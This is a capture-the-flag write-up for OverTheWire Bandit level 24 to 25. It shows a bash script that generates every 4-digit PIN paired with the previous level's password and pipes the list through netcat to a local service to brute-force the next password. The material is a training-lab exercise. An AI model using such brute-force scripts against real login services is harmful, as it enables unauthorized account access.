# OTW - Over The Wire (Bandit) :neckbeard:

## Level 24 ➡ Level 25
## Author: [@th3-gr00t](https://th33-gr00t.tk/) -  [:bird:](https://twitter.com/th3_gr00t/)

> For more resources you can check our my [blog](https://th33gr00t.blogspot.com/)

### Challenge

- The main goal of this challenge was to learn about brute-forcing.
- We were provided the `target host` to connect to, `port` to use, `username` and `password` for authentication.

### How I did it

- So to be honest, I googled alot. Not for the solution but for how to bruteforce using bash and later discovered we were required to use a for loop to create our wordlist.
- With this knowledge I created a script that would create a wordlist then pass it to out listening port on localhost.
- The script goes like this;

```sh
#! /bin/bash

wordlist=passlist.txt

echo -e "Creating wordlist\n"

for i in {0000..9999}
   do
     echo $password_bandit24 $i >> $wordlist
   done

echo -e "Done creating wordlist, proceeding to bruteforce.\n"
head -n 10 $wordlist
echo " "
cat $wordlist | nc localhost 30002
rm $wordlist
```

- The flag will be outputed when the right pin code and current level password has been passed.
- **Note:** The *flag* is the `password` for the next level.

### Conclusion / To Note

> If any please note them down here, if not leave it blank.
